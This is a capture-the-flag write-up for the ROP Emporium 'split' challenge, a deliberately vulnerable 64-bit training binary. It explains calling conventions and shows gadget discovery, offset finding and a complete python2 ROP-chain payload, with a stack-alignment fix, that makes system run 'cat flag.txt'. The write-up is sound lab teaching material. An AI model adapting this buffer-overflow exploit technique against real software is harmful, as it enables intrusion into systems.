# Split

Split is the second challenge available from ROPem.
It builds upon the previous challenge with an added twist.

For this challenge, I went with the 64 bit version. This time, this matters more because we will be calling functions. The calling convetion is different between the two architectures.
In 32 bit:

- Arguments are pushed onto the stack in reverse order (right-to-left, due to the stack being LIFO).
- The CALL instruction pushes the return address onto the stack automatically.

A typical stack frame in 32-bit looks like this (growing upwards towards lower addresses):

```bash
| Local variables    |
| Saved EBP          |
| Return address     |
| Function arguments |
```

In 64 bit:

- The first six integer or pointer arguments are passed in registers: RDI, RSI, RDX, RCX, R8, and R9.
- Any additional arguments are pushed onto the stack.
- The return address is pushed onto the stack during the CALL instruction.

A typical stack frame in 64-bit looks like this (growing upwards towards lower addresses):

```bash
| Local variables     |
| Saved RBP           |
| Return address      |
| Stack arguments     |
```

## First moves

We start by inspecting the binary.

`file`

```bash
└─$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

`checksec`

```bash
└─$ checksec --file=split
[*] '/home/kali/my_challenges/pwn/ropemporium/01-split/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Seems legit. Note that the stack execution protection `NX` is enabled. This means we can't inject shellcode onto the stack and execute it as the stack is RW only.

We also execute the binary and see if a buffer overflow exists by simply inputting too much data to crash the process.

```bash
└─$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault (core dumped)  ./split
```

Yup, it's vulnerable.

We can use the `strings` command to look for any interesting strings in the binary.

```bash
└─$ strings split
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
printf
memset
read
stdout
system
setvbuf
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
split by ROP Emporium
x86_64
Exiting
Contriving a reason to ask user for data...
Thank you!
/bin/ls
;*3$"
/bin/cat flag.txt
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
split.c
pwnme
usefulFunction
```

We can see some functions and some other interesting strings like `/bin/cat flag.txt`.

`pwnme` is here again too so we know where to start in terms of breakpoints in GDB.

## Lay of the land

We now want to analyze the binary to see how this buffer overflow could be used in a meaningful way.

This can be done using various tools. I like using GDB but Ghidra is also an option for static analysis and for more readable decompiled code.

We can start by listing the functions we have in the binary.
![alt text](image.png)
A lot of spicy functions here such as printf@plt, puts@plt and system@plt. These are all external functions defined in the libc library and is called by this binary.

The three functions we care about here is `main`, `pwnme` and `usefulFunction`.

Let's see what these do.

![alt text](image-1.png)

The main function prints some texts and then calls pwnme.

Let's check pwnme

![alt text](image-2.png)

Seems like it's printing some stuff and then reading some input. This corresponds well with what we saw earlier when we ran the program. The function is reading from the stdin file descriptor.

We can trace all these external function calls by calling the binary with `ltrace` if we wish to do so.

The `usefulFunction` does not seem to be used anywhere.

Let's check what's up with it.

![alt text](image-3.png)

It's conveniently calling `system` which is a dangerous libc function that can run an arbitrary shell command. We can see it's moving something to the `edi` register as input to the system function call. Let's see what that might be.

```bash
pwndbg> x/s 0x40084a
0x40084a:       "/bin/ls"
```

So it's calling it with /bin/ls. That's cool, but we want the flag so we probably want it to run something else with `system`.

## Attack plan

1. Find a good string we can use with `system`
2. Since this is in 64 bit, we need a `pop rdi` gadget to pass the argument to `system`.
3. Find out the address of `system`.
4. Find out the return address offset for the buffer overflow.

## Details

Some of these steps we already achieved with our previous analysis. In particular, the address of `system` is `0x400560`.

We're looking for a string that has `/bin/cat flag.txt` as data. This can be achieved in several ways. We can use this command `strings -a -t x split | grep /bin/cat`. Alternatively, we can use gdb, which I will do since I already have it open.

```bash
pwndbg> search -t string "/bin/cat flag.txt"
Searching for string: b'/bin/cat flag.txt\x00'
split           0x601060 '/bin/cat flag.txt'
```

Now, since this is 64 bit, we need a `pop rdi` gadget. There are several tools we can use, I like to user `ropper`.

```bash
└─$ ropper --file split --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret;
```

Finally for the buffer offset, I used the cyclic pattern method again to find the offset to the top of the `rsp` after overflowing it with the pattern similarly to the previous challenge.

```bash
pwndbg> cyclic -l kaaa -n 4
Finding cyclic pattern of 4 bytes: b'kaaa' (hex: 0x6b616161)
Found at offset 40
```

At this point, we have all the ingredients to exploit this binary.

## Exploit

I will write down two exploits for this challenge. One manual and one automated using `pwntools`.

### Manual

```bash
python2 -c 'print "a"*40 + "\xc3\x07\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x60\x05\x40\x00\x00\x00\x00\x00"' > payload
```

This make the chain `[40 padding + pop_rdi_gadget + address of /bin/cat flag.txt + address of system]`. This is how it will be in the stack too. You can execute this with GDB to watch it in action.

So running this on my machine doesn't actually work! We run into a segfault due to this problem below.
![alt text](image-4.png)

The stack is not 16 bytes aligned, which is a requirement for 64 bit calling convention. You can read more about it [here](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment).

We have to realign the stack before we call `system`. To do this we can look for a simple `ret` gadget and insert it just before returning to system to align the stack to 16 bytes.

```bash
└─$ ropper --file split --search "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: split
0x0000000000400542: ret 0x200a;
0x000000000040053e: ret;
```

The second ret fits our needs.

The exploit becomes:

```bash
python2 -c 'print "a"*40 + "\xc3\x07\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x3e\x05\x40\x00\x00\x00\x00\x00" + "\x60\x05\x40\x00\x00\x00\x00\x00"' > payload
```

This makes the chain `[40 padding + pop_rdi_gadget + address of /bin/cat flag.txt + ret_gadget_for_alignment + address of system]`

Your bits is belong to us now.

```bash
└─$ ./split < payload
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
zsh: illegal hardware instruction (core dumped)  ./split < payload
```

### Pwntools

check the `exploit.py` file for the exploit without ROP object and the `exploit_rop.py` for the exploit using the ROP object.
